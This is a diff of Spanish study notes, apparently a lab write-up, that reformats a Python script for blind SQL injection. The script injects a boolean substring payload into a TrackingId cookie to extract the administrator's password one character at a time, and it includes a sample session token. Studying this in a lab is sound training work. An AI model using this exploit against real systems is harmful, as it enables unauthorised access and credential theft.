@@ -70,38 +70,22 @@ Con el Cluster bomb attack estos 2 parametros se probarian todas las combinacion
 
 T ambien pudiéramos crearnos un scrip con python para esta tarea
 
-```
+```python
 from pwn import *
-
 from termcolor import colored
-
 import requests
-
 import sys
-
 import signal
-
 import string
-
-import time
-
-  
+import time  
 
 def def_handler(sig, frame):
-
-print(colored(f"\n[!] Saliendo...\n", 'red'))
-
-p1.failure("Ataque de fuerza bruta detenido")
-
-sys.exit(1)
-
-  
+	print(colored(f"\n[!] Saliendo...\n", 'red'))
+	p1.failure("Ataque de fuerza bruta detenido")
+	sys.exit(1)
 
 # Ctrl+C
-
 signal.signal(signal.SIGINT, def_handler)
-
-  
 
 characters = string.ascii_lowercase + string.digits
 
@@ -124,12 +108,8 @@ for character in characters:
 cookies = {
 
 'TrackingId': f"CtFaF02n79AVORke' and (select substring(password,{position},1) from users where username='administrator')='{character}'-- -",
-
 'session': "qNkwWgEH4xK1io8l3hfZ99AEDACfOWdW"
-
-}
-
-  
+}  
 
 p1.status(cookies['TrackingId'])
 
@@ -145,15 +125,10 @@ p2.status(password)
 
 #print(colored(f"[*] Password parcial: {password}", 'blue'))
 
-break
+break 
 
-  
-
-print(colored(f"\n[+] Password completo: {password}", 'green', attrs=['bold']))
-
-  
+print(colored(f"\n[+] Password completo: {password}", 'green', attrs=['bold']))  
 
 if __name__ == '__main__':
-
-makeSQL()
+	makeSQL()
 ```
